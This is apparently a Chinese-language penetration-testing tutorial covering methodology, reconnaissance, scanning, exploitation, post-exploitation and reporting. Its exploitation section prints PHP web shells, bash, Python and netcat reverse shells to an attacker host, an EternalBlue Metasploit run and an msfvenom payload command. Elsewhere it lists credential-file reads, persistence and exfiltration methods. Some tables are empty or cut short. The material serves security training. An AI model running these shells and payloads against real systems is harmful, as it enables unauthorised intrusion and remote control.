# 05-渗透测试方法论与实战

## 一、渗透测试概述

### 1.1 定义

渗透测试（Penetration Testing）是通过模拟恶意攻击者的技术手段，对目标系统进行安全性评估的过程。

### 1.2 测试分类

#### 按信息量分类

| 类型 | 知识量 | 模拟场景 |
|------|--------|----------|
| 黑盒测试 | 无任何先知信息 | 外部攻击者视角 |
| 灰盒测试 | 部分信息 | 已获得一定权限的攻击者 |
| 白盒测试 | 完全了解系统 | 内部审计/代码审计 |

#### 按目标类型分类

| 类型 | 目标 |
|------|------|
| Web应用渗透 | Web网站、API接口 |
| 内网渗透 | 企业内部网络 |
| 无线网络渗透 | Wi-Fi、蓝牙 |
| 社会工程学 | 人员安全意识 |
| 物理渗透 | 物理设施安全 |
| 移动应用渗透 | APP安全 |
| 云安全评估 | 云环境配置 |

### 1.3 合规与授权

渗透测试必须获得**书面授权**，未经授权的渗透测试属于违法行为。

```
渗透测试授权书应包含：
- 测试范围（IP/域名/系统）
- 测试时间窗口
- 允许的技术手段
- 紧急联系人
- 法律免责条款
- 数据保密条款
```

## 二、渗透测试方法论

### 2.1 PTES（渗透测试执行标准）

```
┌──────────────────────────────────────────────────┐
│  1. 前期交互（Pre-engagement Interactions）        │
│     └─ 范围确认、授权、规则制定                      │
├──────────────────────────────────────────────────┤
│  2. 情报收集（Intelligence Gathering）             │
│     └─ 被动/主动信息收集                            │
├──────────────────────────────────────────────────┤
│  3. 威胁建模（Threat Modeling）                    │
│     └─ 分析攻击面、识别威胁                         │
├──────────────────────────────────────────────────┤
│  4. 漏洞分析（Vulnerability Analysis）             │
│     └─ 发现和分析漏洞                               │
├──────────────────────────────────────────────────┤
│  5. 渗透利用（Exploitation）                       │
│     └─ 利用漏洞获取访问权限                         │
├──────────────────────────────────────────────────┤
│  6. 后渗透（Post-Exploitation）                    │
│     └─ 权限提升、横向移动、持久化                    │
├──────────────────────────────────────────────────┤
│  7. 报告（Reporting）                              │
│     └─ 发现汇总、风险评估、修复建议                  │
└──────────────────────────────────────────────────┘
```

### 2.2 OWASP测试方法论

针对Web应用的测试框架：

```
信息收集 → 配置管理 → 身份认证 → 授权 → 会话管理
→ 输入验证 → 错误处理 → 加密通信 → 业务逻辑 → 客户端安全
```

### 2.3 MITRE ATT&CK框架

将攻击者行为映射为战术（Tactics）和技术（Techniques）：

```
侦察 → 资源开发 → 初始访问 → 执行 → 持久化
→ 权限提升 → 防御规避 → 凭证访问 → 发现
→ 横向移动 → 收集 → 命令控制 → 数据渗出 → 影响
```

## 三、情报收集（Reconnaissance）

### 3.1 被动信息收集

不直接与目标交互，从公开渠道获取信息。

#### 域名与子域名

| 工具/方法 | 说明 |
|-----------|------|
| WHOIS查询 | 域名注册信息 |
| DNS枚举 | 子域名发现（subfinder, amass） |
| 证书透明日志 | crt.sh查询SSL证书 |
| 搜索引擎 | Google Hacking |
| GitHub | 代码泄露、配置文件 |
| Shodan/Censys | 互联网设备搜索引擎 |

#### Google Hacking语法

```
site:example.com             # 限定搜索域名
filetype:pdf "confidential"  # 搜索敏感文件
inurl:admin                  # URL包含admin
intitle:"index of"           # 目录列表
site:example.com ext:sql     # 搜索SQL文件
"password" filetype:txt site:example.com
```

#### 人员信息收集

- 社交媒体（LinkedIn、微博、脉脉）
- 邮箱格式枚举
- 员工姓名、职位
- GitHub/GitLab代码仓库

### 3.2 主动信息收集

直接与目标交互获取信息。

#### 端口扫描

```bash
# Nmap基本扫描
nmap -sS -T4 target.com           # SYN扫描
nmap -sV -p 1-65535 target.com    # 全端口服务版本探测
nmap -A -T4 target.com            # 综合扫描
nmap --script=vuln target.com     # 漏洞扫描
nmap -sU --top-ports 100 target   # UDP常见端口

# 常见端口
21 - FTP     22 - SSH      23 - Telnet    25 - SMTP
53 - DNS     80 - HTTP     110 - POP3     143 - IMAP
443 - HTTPS  445 - SMB     3306 - MySQL   3389 - RDP
6379 - Redis 8080 - HTTP   27017 - MongoDB
```

#### 目录/文件发现

```bash
# 目录爆破
dirb http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt

# 常见敏感路径
/robots.txt          # 搜索引擎爬虫规则
/sitemap.xml         # 网站地图
/.git/               # Git仓库泄露
/.env                # 环境配置文件
/backup/             # 备份文件
/admin               # 后台管理
/api/v1              # API接口
/swagger.json        # API文档
```

#### 指纹识别

```bash
# Web技术识别
whatweb http://target.com
wappalyzer（浏览器插件）

# CMS识别
Wpscan（WordPress）
JoomScan（Joomla）
Droopescan（Drupal）
```

## 四、漏洞扫描与分析

### 4.1 自动化扫描工具

| 工具 | 用途 |
|------|------|
| Nessus | 综合漏洞扫描 |

### 4.2 Burp Suite使用

```
代理(Proxy) → 拦截HTTP/S请求
扫描器(Scanner) → 自动化漏洞扫描
入侵者(Intruder) → 自定义攻击（爆破、fuzzing）
中继器(Repeater) → 手动重放和修改请求
解码器(Decoder) → 编解码工具
比较器(Comparer) → 数据比较
扩展(Extender) → 插件扩展
```

### 4.3 手动漏洞验证

```
步骤：
1. 理解应用逻辑和功能
2. 识别输入点（参数、头、Cookie）
3. 构造测试用例
4. 发送请求并分析响应
5. 验证漏洞是否存在
6. 评估影响和可利用性
```

## 五、漏洞利用（Exploitation）

### 5.1 常见利用场景

#### Web Shell上传

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
```

#### 反弹Shell

```bash
# Bash反弹
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python反弹
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat反弹
nc -e /bin/sh ATTACKER_IP 4444
```

#### Metasploit框架

```bash
# 搜索漏洞模块
msfconsole
search type:exploit platform:windows

# 使用模块
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST attacker_ip
exploit

# 生成载荷
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
```

### 5.2 密码攻击

| 方法 | 说明 |
|------|------|
| 字典攻击 | 使用常见密码字典 |
| 暴力破解 | 穷举所有组合 |
| 彩虹表 | 预计算哈希表 |
| 凭证填充 | 使用泄露的账号密码组合 |
| 密码喷洒 | 少量密码尝试大量账户 |

## 六、后渗透（Post-Exploitation）

### 6.1 信息收集

```bash
# Linux
whoami && id                    # 当前用户
cat /etc/passwd                 # 用户列表
uname -a                        # 内核版本
ifconfig / ip addr              # 网络接口
netstat -tlnp                   # 网络连接
ps aux                          # 运行进程
sudo -l                         # sudo权限
find / -perm -4000 2>/dev/null  # SUID文件
crontab -l                      # 计划任务

# Windows
whoami /all                     # 用户信息
systeminfo                      # 系统信息
ipconfig /all                   # 网络配置
net user                        # 用户列表
net localgroup administrators    # 管理员组
tasklist                        # 运行进程
netstat -an                     # 网络连接
schtasks /query                 # 计划任务
```

### 6.2 权限提升

| 方法 | 说明 |
|------|------|

| sudo配置错误 | 不安全的sudoers配置 |
| 计划任务 | 可写的cron任务 |
| PATH劫持 | 修改PATH变量 |
| 可写敏感文件 | /etc/passwd, /etc/shadow |

#### Windows提权

| 方法 | 说明 |
|------|------|

| 不安全的服务权限 | 可写的服务二进制文件 |
| DLL劫持 | 恶意DLL替代 |
| 注册表自启动 | 可写的注册表键值 |
| AlwaysInstallElevated | 以系统权限安装MSI |

### 6.3 横向移动

```
横向移动技术：
├── Pass the Hash（PtH）- 使用哈希值认证
├── Pass the Ticket（PtT）- Kerberos票据传递
├── Overpass the Hash - 哈希获取TGT
├── 远程执行 - PSExec, WMI, WinRM
├── RDP跳板 - 远程桌面
├── SSH隧道 - 端口转发
└── 服务漏洞 - 利用内网服务
```

### 6.4 持久化

| 技术 | 平台 | 说明 |
|------|------|------|
| 计划任务 | 全平台 | Cron/Task Scheduler |
| 启动项 | 全平台 | 开机自启动 |
| 服务 | Windows | 注册为系统服务 |
| 注册表 | Windows | Run/RunOnce键 |
| SSH密钥 | Linux | 添加authorized_keys |
| Web Shell | Web | 植入后门 |
| Rootkit | 全平台 | 内核级后门 |
| Golden Ticket | Windows | Kerberos TGT伪造 |
| Silver Ticket | Windows | Kerberos服务票据伪造 |

### 6.5 数据渗出

```
数据渗出通道：
├── HTTP/HTTPS - 伪装为正常Web流量
├── DNS隧道 - 通过DNS查询渗出
├── ICMP隧道 - 通过Ping渗出
├── 邮件 - SMTP发送
├── 云存储 - 上传到云服务
```

## 八、渗透测试报告

### 8.1 报告结构

```
1. 执行摘要
   - 测试范围和目标
   - 关键发现
   - 风险评估总结

2. 方法论
   - 测试方法
   - 使用的工具
   - 测试时间线

3. 发现详情
   - 每个漏洞：
     a. 漏洞名称
     b. 风险等级（严重/高/中/低/信息）
     c. 影响范围
     d. 复现步骤
     e. 证据截图
     f. 修复建议

4. 风险矩阵
5. 修复优先级建议
6. 附录
```

### 8.2 风险评估

```
风险 = 可能性 × 影响

CVSS评分标准：
0.0       - 无风险
0.1 - 3.9 - 低
4.0 - 6.9 - 中
7.0 - 8.9 - 高
9.0 - 10.0 - 严重
```
